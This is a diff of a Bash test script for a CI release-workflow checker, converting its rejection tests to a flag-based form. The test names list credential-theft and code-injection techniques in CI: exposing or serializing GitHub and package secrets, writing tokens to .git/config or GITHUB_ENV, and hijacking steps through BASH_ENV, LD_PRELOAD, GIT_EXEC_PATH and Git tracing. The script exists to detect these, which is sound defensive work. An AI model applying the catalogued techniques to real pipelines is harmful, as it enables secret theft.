-expect_rejection "a verification suite receiving a wrapped package token (#1712)" expose_wrapped_package_token_to_verification_suite
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a wrapped package secret in verification" \
-  || fail "the generated suite rejected a wrapped package token for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verification suite receiving a folded wrapped package token (#1712)" expose_folded_wrapped_package_token_to_verification_suite
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a folded package secret in verification" \
-  || fail "the generated suite rejected a folded wrapped package token for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verification suite serializing the secrets context (#1712)" expose_serialized_secrets_to_verification_suite
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects serialization of the secrets object in verification" \
-  || fail "the generated suite rejected serialized secrets for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verification suite serializing the GitHub context (#1712)" expose_serialized_github_context_to_verification_suite
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects serialization of the GitHub context in verification" \
-  || fail "the generated suite rejected serialized GitHub context for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verification suite reading github['token'] (#1712)" expose_indexed_github_token_to_verification_suite
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects indexed GitHub token access in verification" \
-  || fail "the generated suite rejected indexed GitHub token for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verification suite inheriting a GitHub token through YAML aliases (#1712)" expose_release_state_token_through_yaml_alias
-sync_last_rejection
-grep -qF 'uses YAML anchors or aliases in a release workflow (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects YAML aliases that merge release-state credentials into verification" \
-  || fail "the generated suite rejected an aliased Git token for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release state step writing its token directly into .git/config (#1712)" persist_release_token_in_git_config_file
-sync_last_rejection
-grep -qF 'does not match the approved restart-safe release-state script (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects unapproved credential-bearing release-state commands" \
-  || fail "the generated suite rejected a modified release-state command for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release state step forwarding its token through GITHUB_ENV (#1712)" persist_release_token_to_github_env
-sync_last_rejection
-grep -qF 'does not match the approved restart-safe release-state script (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects release-state token forwarding through runner command files" \
-  || fail "the generated suite rejected a GITHUB_ENV mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release state step loading repository code through quoted BASH_ENV (#1712)" configure_token_step_bash_env
-sync_last_rejection
-grep -qF 'does not restrict the restart-safe release-state environment (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects shell startup code in token environment" \
-  || fail "the generated suite rejected BASH_ENV mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release state step selecting custom shell (#1712)" configure_token_step_custom_shell
-sync_last_rejection
-grep -qF 'configures a custom shell or action in the credentialed release-state step (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects custom shells in credentialed workflows" \
-  || fail "the generated suite rejected a custom shell mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify job setting custom shell through quoted defaults (#1712)" configure_verify_job_default_shell
-sync_last_rejection
-grep -qF 'configures run defaults (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects inherited custom shells in verify job" \
-  || fail "the generated suite rejected a default-shell mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow enabling Bash xtrace through quoted SHELLOPTS (#1712)" configure_workflow_shelopts
-sync_last_rejection
-grep -qF 'configures credential-sensitive environment outside the credentialed step (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects inherited Bash xtrace in token step" \
-  || fail "the generated suite rejected SHELLOPTS mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow preloading library in credentialed steps (#1712)" configure_workflow_loader_env LD_PRELOAD
-sync_last_rejection
-grep -qF 'configures credential-sensitive environment outside the credentialed step (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects inherited LD_PRELOAD in token step" \
-  || fail "the generated suite rejected an LD_PRELOAD mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow adding dynamic loader audit library (#1712)" configure_workflow_loader_env LD_AUDIT
-sync_last_rejection
-grep -qF 'configures credential-sensitive environment outside the credentialed step (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects inherited LD_AUDIT in token step" \
-  || fail "the generated suite rejected an LD_AUDIT mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow changing dynamic library search paths (#1712)" configure_workflow_loader_env LD_LIBRARY_PATH
-sync_last_rejection
-grep -qF 'inherits unapproved job-level environment in release verification (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects job-level LD_LIBRARY_PATH in release verification" \
-  || fail "the generated suite rejected an LD_LIBRARY_PATH mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow logging Git authorization values through curl and Trace2 (#1712)" configure_workflow_git_trace
-sync_last_rejection
-grep -qF 'configures credential-sensitive environment outside the credentialed step (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects Git curl and Trace2 environment logging in token step" \
-  || fail "the generated suite rejected Git tracing mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow redirecting Git remote helpers (#1712)" configure_workflow_loader_env GIT_EXEC_PATH
-sync_last_rejection
-grep -qF 'configures credential-sensitive environment outside the credentialed step (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects repository-controlled remote helper in token step" \
-  || fail "the generated suite rejected a Git remote-helper mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow selecting hostile Git config sources (#1712)" configure_workflow_git_config_sources
-sync_last_rejection
-grep -qF 'configures credential-sensitive environment outside the credentialed step (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects inherited system and global Git config paths" \
-  || fail "the generated suite rejected Git config-source mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow overriding Git config parameters (#1712)" configure_workflow_config_parameters
-sync_last_rejection
-grep -qF 'configures credential-sensitive environment outside the credentialed step (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects inherited Git config parameters" \
-  || fail "the generated suite rejected Git config-parameters mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a lifecycle step that only prints npm rebuild (#1712)" make_lifecycle_step_print_instead_of_rebuild
-sync_last_rejection
-grep -qF 'does not restore dependency lifecycle execution after acquisition (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite requires lifecycle command to execute exactly" \
-  || fail "the generated suite rejected a lifecycle mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release verification job granting contents-write (#1712)" grant_verify_job_write_permissions
-sync_last_rejection
-grep -qF 'requires verify-job permissions to be exactly contents: read (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite holds verification to read-only contents permission" \
-  || fail "the generated suite rejected a write-permission mutation for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release verification job that continues after failure (#1717)" allow_verify_job_to_continue_on_error
-sync_last_rejection
-grep -qF 'allows the release verification job to continue after failure (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects job-level continue-on-error for verification" \
-  || fail "job-level continue-on-error was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release verification step that continues after failure (#1717)" allow_verification_step_to_continue_on_error
-sync_last_rejection
-grep -qF 'allows the release verification step to continue after failure (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects step-level continue-on-error for verification" \
-  || fail "step-level continue-on-error was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release verification step skipped by its condition (#1717)" skip_release_verification
-sync_last_rejection
-grep -qF 'does not require a selected version before release verification (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a skipped verification step" \
-  || fail "a skipped verification step was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release verification step replaced with a no-op (#1717)" replace_release_verification_with_noop
-sync_last_rejection
-grep -qF 'does not stamp the dispatched package version before the verification build or suite (#519)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a no-op that skips the version stamp" \
-  || fail "a no-op verification script was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "release verification failure handler removed (#1717)" \
-  remove_release_verification_failure_handler
-sync_last_rejection
-grep -qF 'does not match the approved release verification script (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects removal of the verification failure handler" \
-  || fail "a removed verification failure handler was rejected for another reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'does not check out the dependency acquisition contract at its pinned ref (#1712)' \
+  --pass "the generated suite binds the dependency acquisition checkout to the contract ref" \
+  --fail "an acquisition contract checkout ref drift was rejected for another reason" \
+  "a dependency acquisition contract checkout on an unpinned branch (#1712)" drift_acquisition_contract_checkout_ref
+expect_rejection --reason 'configures unapproved release verification job settings (#1712)' \
+  --pass "the generated suite pins the release verification job settings" \
+  --fail "a verify job container was rejected for another reason" \
+  "a release verification job run inside a caller-chosen container (#1712)" add_verify_job_container
+expect_rejection --reason 'does not refuse a repository-controlled selection contract path (#1712)' \
+  --pass "the generated suite requires the reserved selection contract path refusal" \
+  --fail "a missing selection-path refusal was rejected for another reason" \
+  "a verify job without its reserved selection contract path refusal (#1712)" drop_verify_selection_path_guard
+expect_rejection --reason 'does not refuse a repository-controlled dependency acquisition contract path (#1712)' \
+  --pass "the generated suite requires the reserved acquisition contract path refusal" \
+  --fail "a missing reserved-path refusal was rejected for another reason" \
+  "a verify job without its reserved acquisition contract path refusal (#1712)" drop_verify_contract_path_guard
+expect_rejection --reason 'does not install the dependency tree from the acquisition cache without credentials (#1712)' \
+  --pass "the generated suite requires the tokenless install to read the acquisition cache" \
+  --fail "an online tokenless install was rejected for another reason" \
+  "a tokenless dependency install that bypasses the acquisition cache (#1712)" install_tokenless_tree_online
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the generated suite keeps the package credential off the tree-building install" \
+  --fail "a credentialed tree-building install was rejected for another reason" \
+  "a package credential on the tree-building install (#1712)" credential_tokenless_install
+expect_rejection --reason 'uses unsupported explicit YAML mapping keys (#1717)' \
+  --pass "the generated suite rejects explicit YAML mapping keys before environment checks" \
+  --fail "an escaped explicit defaults key was rejected for another reason" \
+  "an escaped YAML explicit key setting inherited working-directory defaults (#1717)" add_escaped_defaults_explicit_key
+expect_rejection --reason 'uses unsupported explicit YAML mapping keys (#1717)' \
+  --pass "the generated suite rejects multiline explicit YAML mapping keys" \
+  --fail "a multiline escaped explicit defaults key was rejected for another reason" \
+  "a multiline escaped YAML explicit key setting inherited working-directory defaults (#1717)" add_multiline_escaped_defaults_explicit_key
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the generated suite rejects Git credentials inherited by release verification" \
+  --fail "the generated suite rejected an inherited Git token for another reason" \
+  "a verification job inheriting GITHUB_TOKEN (#1712)" expose_github_token_to_verify_job
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the generated suite rejects a wrapped package secret in verification" \
+  --fail "the generated suite rejected a wrapped package token for another reason" \
+  "a verification suite receiving a wrapped package token (#1712)" expose_wrapped_package_token_to_verification_suite
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the generated suite rejects a folded package secret in verification" \
+  --fail "the generated suite rejected a folded wrapped package token for another reason" \
+  "a verification suite receiving a folded wrapped package token (#1712)" expose_folded_wrapped_package_token_to_verification_suite
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the generated suite rejects serialization of the secrets object in verification" \
+  --fail "the generated suite rejected serialized secrets for another reason" \
+  "a verification suite serializing the secrets context (#1712)" expose_serialized_secrets_to_verification_suite
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the generated suite rejects serialization of the GitHub context in verification" \
+  --fail "the generated suite rejected serialized GitHub context for another reason" \
+  "a verification suite serializing the GitHub context (#1712)" expose_serialized_github_context_to_verification_suite
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the generated suite rejects indexed GitHub token access in verification" \
+  --fail "the generated suite rejected indexed GitHub token for another reason" \
+  "a verification suite reading github['token'] (#1712)" expose_indexed_github_token_to_verification_suite
+expect_rejection --reason 'uses YAML anchors or aliases in a release workflow (#1712)' \
+  --pass "the generated suite rejects YAML aliases that merge release-state credentials into verification" \
+  --fail "the generated suite rejected an aliased Git token for another reason" \
+  "a verification suite inheriting a GitHub token through YAML aliases (#1712)" expose_release_state_token_through_yaml_alias
+expect_rejection --reason 'does not match the approved restart-safe release-state script (#1712)' \
+  --pass "the generated suite rejects unapproved credential-bearing release-state commands" \
+  --fail "the generated suite rejected a modified release-state command for another reason" \
+  "a release state step writing its token directly into .git/config (#1712)" persist_release_token_in_git_config_file
+expect_rejection --reason 'does not match the approved restart-safe release-state script (#1712)' \
+  --pass "the generated suite rejects release-state token forwarding through runner command files" \
+  --fail "the generated suite rejected a GITHUB_ENV mutation for another reason" \
+  "a release state step forwarding its token through GITHUB_ENV (#1712)" persist_release_token_to_github_env
+expect_rejection --reason 'does not restrict the restart-safe release-state environment (#1712)' \
+  --pass "the generated suite rejects shell startup code in token environment" \
+  --fail "the generated suite rejected BASH_ENV mutation for another reason" \
+  "a release state step loading repository code through quoted BASH_ENV (#1712)" configure_token_step_bash_env
+expect_rejection --reason 'configures a custom shell or action in the credentialed release-state step (#1712)' \
+  --pass "the generated suite rejects custom shells in credentialed workflows" \
+  --fail "the generated suite rejected a custom shell mutation for another reason" \
+  "a release state step selecting custom shell (#1712)" configure_token_step_custom_shell
+expect_rejection --reason 'configures run defaults (#1712)' \
+  --pass "the generated suite rejects inherited custom shells in verify job" \
+  --fail "the generated suite rejected a default-shell mutation for another reason" \
+  "a verify job setting custom shell through quoted defaults (#1712)" configure_verify_job_default_shell
+expect_rejection --reason 'configures credential-sensitive environment outside the credentialed step (#1712)' \
+  --pass "the generated suite rejects inherited Bash xtrace in token step" \
+  --fail "the generated suite rejected SHELLOPTS mutation for another reason" \
+  "a workflow enabling Bash xtrace through quoted SHELLOPTS (#1712)" configure_workflow_shelopts
+expect_rejection --reason 'configures credential-sensitive environment outside the credentialed step (#1712)' \
+  --pass "the generated suite rejects inherited LD_PRELOAD in token step" \
+  --fail "the generated suite rejected an LD_PRELOAD mutation for another reason" \
+  "a workflow preloading library in credentialed steps (#1712)" configure_workflow_loader_env LD_PRELOAD
+expect_rejection --reason 'configures credential-sensitive environment outside the credentialed step (#1712)' \
+  --pass "the generated suite rejects inherited LD_AUDIT in token step" \
+  --fail "the generated suite rejected an LD_AUDIT mutation for another reason" \
+  "a workflow adding dynamic loader audit library (#1712)" configure_workflow_loader_env LD_AUDIT
+expect_rejection --reason 'inherits unapproved job-level environment in release verification (#1717)' \
+  --pass "the generated suite rejects job-level LD_LIBRARY_PATH in release verification" \
+  --fail "the generated suite rejected an LD_LIBRARY_PATH mutation for another reason" \
+  "a workflow changing dynamic library search paths (#1712)" configure_workflow_loader_env LD_LIBRARY_PATH
+expect_rejection --reason 'configures credential-sensitive environment outside the credentialed step (#1712)' \
+  --pass "the generated suite rejects Git curl and Trace2 environment logging in token step" \
+  --fail "the generated suite rejected Git tracing mutation for another reason" \
+  "a workflow logging Git authorization values through curl and Trace2 (#1712)" configure_workflow_git_trace
+expect_rejection --reason 'configures credential-sensitive environment outside the credentialed step (#1712)' \
+  --pass "the generated suite rejects repository-controlled remote helper in token step" \
+  --fail "the generated suite rejected a Git remote-helper mutation for another reason" \
+  "a workflow redirecting Git remote helpers (#1712)" configure_workflow_loader_env GIT_EXEC_PATH
+expect_rejection --reason 'configures credential-sensitive environment outside the credentialed step (#1712)' \
+  --pass "the generated suite rejects inherited system and global Git config paths" \
+  --fail "the generated suite rejected Git config-source mutation for another reason" \
+  "a workflow selecting hostile Git config sources (#1712)" configure_workflow_git_config_sources
+expect_rejection --reason 'configures credential-sensitive environment outside the credentialed step (#1712)' \
+  --pass "the generated suite rejects inherited Git config parameters" \
+  --fail "the generated suite rejected Git config-parameters mutation for another reason" \
+  "a workflow overriding Git config parameters (#1712)" configure_workflow_config_parameters
+expect_rejection --reason 'does not restore dependency lifecycle execution after acquisition (#1712)' \
+  --pass "the generated suite requires lifecycle command to execute exactly" \
+  --fail "the generated suite rejected a lifecycle mutation for another reason" \
+  "a lifecycle step that only prints npm rebuild (#1712)" make_lifecycle_step_print_instead_of_rebuild
+expect_rejection --reason 'requires verify-job permissions to be exactly contents: read (#1712)' \
+  --pass "the generated suite holds verification to read-only contents permission" \
+  --fail "the generated suite rejected a write-permission mutation for another reason" \
+  "a release verification job granting contents-write (#1712)" grant_verify_job_write_permissions
+expect_rejection --reason 'allows the release verification job to continue after failure (#1717)' \
+  --pass "the generated suite rejects job-level continue-on-error for verification" \
+  --fail "job-level continue-on-error was rejected for another reason" \
+  "a release verification job that continues after failure (#1717)" allow_verify_job_to_continue_on_error
+expect_rejection --reason 'allows the release verification step to continue after failure (#1717)' \
+  --pass "the generated suite rejects step-level continue-on-error for verification" \
+  --fail "step-level continue-on-error was rejected for another reason" \
+  "a release verification step that continues after failure (#1717)" allow_verification_step_to_continue_on_error
+expect_rejection --reason 'does not require a selected version before release verification (#1717)' \
+  --pass "the generated suite rejects a skipped verification step" \
+  --fail "a skipped verification step was rejected for another reason" \
+  "a release verification step skipped by its condition (#1717)" skip_release_verification
+expect_rejection --reason 'does not stamp the dispatched package version before the verification build or suite (#519)' \
+  --pass "the generated suite rejects a no-op that skips the version stamp" \
+  --fail "a no-op verification script was rejected for another reason" \
+  "a release verification step replaced with a no-op (#1717)" replace_release_verification_with_noop
+expect_rejection --reason 'does not match the approved release verification script (#1717)' \
+  --pass "the generated suite rejects removal of the verification failure handler" \
+  --fail "a removed verification failure handler was rejected for another reason" \
+  "release verification failure handler removed (#1717)" remove_release_verification_failure_handler
 quoted_checkout="$tmproot/adopter-quoted-checkout"
 cp -a "$adopter" "$quoted_checkout"
 quote_checkout_reference "$quoted_checkout"
@@ -5271,29 +5294,22 @@ else
 fi
 SCHED_SCRIPT
 )"
-expect_rejection "an inline checkout mapping without disabled credentials (#1717)" inline_checkout_without_persist_credentials
-sync_last_rejection
-grep -qF 'persists checkout credentials into release repository code (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite detects checkout credential persistence in inline YAML" \
-  || fail "an inline checkout credential mutation was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "checkout reference uses case-variant owner and repository (#1717)" \
-  uppercase_checkout_without_disabled_credentials
-sync_last_rejection
-grep -qF 'persists checkout credentials into release repository code (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite checks checkout references case-insensitively" \
-  || fail "a case-variant checkout reference was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "checkout reference uses a folded YAML scalar (#1717)" \
-  folded_checkout_reference_without_disabled_credentials
-sync_last_rejection
-grep -qF 'cannot safely inspect a release workflow action reference (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects unsupported folded checkout references" \
-  || fail "a folded checkout reference was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "release job hides steps in a flow-style sequence (#1717)" \
-  add_flow_style_checkout_step
-sync_last_rejection
-grep -qF 'cannot safely inspect flow-style release workflow steps (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects unparsed flow-style step collections" \
-  || fail "flow-style release steps were rejected for another reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'persists checkout credentials into release repository code (#1712)' \
+  --pass "the generated suite detects checkout credential persistence in inline YAML" \
+  --fail "an inline checkout credential mutation was rejected for another reason" \
+  "an inline checkout mapping without disabled credentials (#1717)" inline_checkout_without_persist_credentials
+expect_rejection --reason 'persists checkout credentials into release repository code (#1712)' \
+  --pass "the generated suite checks checkout references case-insensitively" \
+  --fail "a case-variant checkout reference was rejected for another reason" \
+  "checkout reference uses case-variant owner and repository (#1717)" uppercase_checkout_without_disabled_credentials
+expect_rejection --reason 'cannot safely inspect a release workflow action reference (#1717)' \
+  --pass "the generated suite rejects unsupported folded checkout references" \
+  --fail "a folded checkout reference was rejected for another reason" \
+  "checkout reference uses a folded YAML scalar (#1717)" folded_checkout_reference_without_disabled_credentials
+expect_rejection --reason 'cannot safely inspect flow-style release workflow steps (#1717)' \
+  --pass "the generated suite rejects unparsed flow-style step collections" \
+  --fail "flow-style release steps were rejected for another reason" \
+  "release job hides steps in a flow-style sequence (#1717)" add_flow_style_checkout_step
 reindented_adopter="$tmproot/adopter-reindented-jobs"
 cp -a "$adopter" "$reindented_adopter"
 reindent_release_job_fields "$reindented_adopter"
@@ -5305,92 +5321,65 @@ else
 fi
 SCHED_SCRIPT
 )"
-expect_rejection "release verifier uses PATH modified by dependency lifecycle scripts (#1717)" \
-  use_mutable_path_for_release_verification
-sync_last_rejection
-grep -qF 'does not match the approved release verification script (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects runner PATH in release verification" \
-  || fail "a mutable verifier PATH was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "release verification PATH capture overrides runner PATH (#1717)" \
-  add_capture_path_override
-sync_last_rejection
-grep -qF 'overrides the runner-managed PATH before release verification (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a PATH override in the trusted capture step" \
-  || fail "a capture-step PATH override was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "verify job overrides runner PATH (#1717)" add_verify_job_path_override
-sync_last_rejection
-grep -qF 'overrides the runner-managed PATH before release verification (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a job-level PATH override" \
-  || fail "a job-level PATH override was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "release verification PATH is captured after dependency lifecycle code (#1717)" \
-  move_capture_after_lifecycle_scripts
-sync_last_rejection
-grep -qF 'does not capture trusted release verification runtime inputs (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite requires PATH capture immediately after setup-node" \
-  || fail "a late PATH capture was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "an escaped flow-style environment key selects runner PATH (#1717)" \
-  add_escaped_flow_path_environment
-sync_last_rejection
-grep -qF 'uses an unsupported or ambiguous environment mapping (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects escaped flow-style PATH environment keys" \
-  || fail "an escaped flow-style PATH key was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a tagged flow-style environment key selects Bash startup script (#1717)" \
-  add_tagged_flow_bash_env
-sync_last_rejection
-grep -qF 'uses an unsupported or ambiguous environment mapping (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects tagged flow-style BASH_ENV environment keys" \
-  || fail "a tagged flow-style BASH_ENV key was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "an explicit-key BASH_ENV mapping selects Bash startup script (#1717)" \
-  add_explicit_bash_env_key
-sync_last_rejection
-grep -qF 'uses an unsupported or ambiguous environment mapping (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects explicit-key BASH_ENV mappings" \
-  || fail "an explicit-key BASH_ENV mapping was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "an inserted verify step writes Bash startup script through GITHUB_ENV (#1717)" \
-  add_pre_capture_environment_writer
-sync_last_rejection
-grep -qF 'does not use the approved verify-job step sequence (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects unapproved verify-job steps before dependency credentials" \
-  || fail "an inserted environment-writing step was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "an existing release-plan step writes Bash startup script through GITHUB_ENV (#1717)" \
-  add_in_place_precredential_environment_writer
-sync_last_rejection
-grep -qF 'contains an unapproved verify step before credentialed dependency installation (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite pins existing verify-job commands before dependency credentials" \
-  || fail "an in-place environment-writing mutation was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "an existing release-plan step injects PYTHONPATH (#1717)" \
-  add_precredential_pythonpath
-sync_last_rejection
-grep -qF 'contains an unapproved verify step before credentialed dependency installation (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite pins pre-credential step environment fields" \
-  || fail "a pre-credential PYTHONPATH mutation was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "the stamped-version step changes generator-declared package directories (#1717)" \
-  drift_verify_stamp_package_directories
-sync_last_rejection
-grep -qF 'has an unapproved package-directory assignment in Stamp the dispatched package versions (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite pins package directories in the version-stamp step" \
-  || fail "an altered version-stamp package directory was rejected for another reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'does not match the approved release verification script (#1717)' \
+  --pass "the generated suite rejects runner PATH in release verification" \
+  --fail "a mutable verifier PATH was rejected for another reason" \
+  "release verifier uses PATH modified by dependency lifecycle scripts (#1717)" use_mutable_path_for_release_verification
+expect_rejection --reason 'overrides the runner-managed PATH before release verification (#1717)' \
+  --pass "the generated suite rejects a PATH override in the trusted capture step" \
+  --fail "a capture-step PATH override was rejected for another reason" \
+  "release verification PATH capture overrides runner PATH (#1717)" add_capture_path_override
+expect_rejection --reason 'overrides the runner-managed PATH before release verification (#1717)' \
+  --pass "the generated suite rejects a job-level PATH override" \
+  --fail "a job-level PATH override was rejected for another reason" \
+  "verify job overrides runner PATH (#1717)" add_verify_job_path_override
+expect_rejection --reason 'does not capture trusted release verification runtime inputs (#1717)' \
+  --pass "the generated suite requires PATH capture immediately after setup-node" \
+  --fail "a late PATH capture was rejected for another reason" \
+  "release verification PATH is captured after dependency lifecycle code (#1717)" move_capture_after_lifecycle_scripts
+expect_rejection --reason 'uses an unsupported or ambiguous environment mapping (#1717)' \
+  --pass "the generated suite rejects escaped flow-style PATH environment keys" \
+  --fail "an escaped flow-style PATH key was rejected for another reason" \
+  "an escaped flow-style environment key selects runner PATH (#1717)" add_escaped_flow_path_environment
+expect_rejection --reason 'uses an unsupported or ambiguous environment mapping (#1717)' \
+  --pass "the generated suite rejects tagged flow-style BASH_ENV environment keys" \
+  --fail "a tagged flow-style BASH_ENV key was rejected for another reason" \
+  "a tagged flow-style environment key selects Bash startup script (#1717)" add_tagged_flow_bash_env
+expect_rejection --reason 'uses an unsupported or ambiguous environment mapping (#1717)' \
+  --pass "the generated suite rejects explicit-key BASH_ENV mappings" \
+  --fail "an explicit-key BASH_ENV mapping was rejected for another reason" \
+  "an explicit-key BASH_ENV mapping selects Bash startup script (#1717)" add_explicit_bash_env_key
+expect_rejection --reason 'does not use the approved verify-job step sequence (#1717)' \
+  --pass "the generated suite rejects unapproved verify-job steps before dependency credentials" \
+  --fail "an inserted environment-writing step was rejected for another reason" \
+  "an inserted verify step writes Bash startup script through GITHUB_ENV (#1717)" add_pre_capture_environment_writer
+expect_rejection --reason 'contains an unapproved verify step before credentialed dependency installation (#1717)' \
+  --pass "the generated suite pins existing verify-job commands before dependency credentials" \
+  --fail "an in-place environment-writing mutation was rejected for another reason" \
+  "an existing release-plan step writes Bash startup script through GITHUB_ENV (#1717)" add_in_place_precredential_environment_writer
+expect_rejection --reason 'contains an unapproved verify step before credentialed dependency installation (#1717)' \
+  --pass "the generated suite pins pre-credential step environment fields" \
+  --fail "a pre-credential PYTHONPATH mutation was rejected for another reason" \
+  "an existing release-plan step injects PYTHONPATH (#1717)" add_precredential_pythonpath
+expect_rejection --reason 'has an unapproved package-directory assignment in Stamp the dispatched package versions (#1717)' \
+  --pass "the generated suite pins package directories in the version-stamp step" \
+  --fail "an altered version-stamp package directory was rejected for another reason" \
+  "the stamped-version step changes generator-declared package directories (#1717)" drift_verify_stamp_package_directories
 for stamp_mutation in command condition environment; do
-  expect_rejection "the version-stamp step changes its $stamp_mutation (#1717)" \
-    drift_verify_stamp_step "$stamp_mutation"
-sync_last_rejection
-  grep -qF 'does not match the approved package-version stamp step (#1717)' "$tmproot/run.out" \
-    && pass "the generated suite pins the full version-stamp step" \
-    || fail "a changed version-stamp $stamp_mutation was rejected for another reason: $(tail -2 "$tmproot/run.out")"
+  expect_rejection --reason 'does not match the approved package-version stamp step (#1717)' \
+    --pass "the generated suite pins the full version-stamp step" \
+    --fail "a changed version-stamp $stamp_mutation was rejected for another reason" \
+    "the version-stamp step changes its $stamp_mutation (#1717)" drift_verify_stamp_step "$stamp_mutation"
 done
-expect_rejection "generator provenance changes the contract-pinned package set (#1717)" \
-  drift_generator_provenance_only '--only-package-dir compat'
-sync_last_rejection
-grep -qF 'does not declare valid package directories in generator provenance (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite binds provenance to canonical package-directory inputs" \
-  || fail "altered generator provenance was rejected for another reason: $(tail -2 "$tmproot/run.out")"
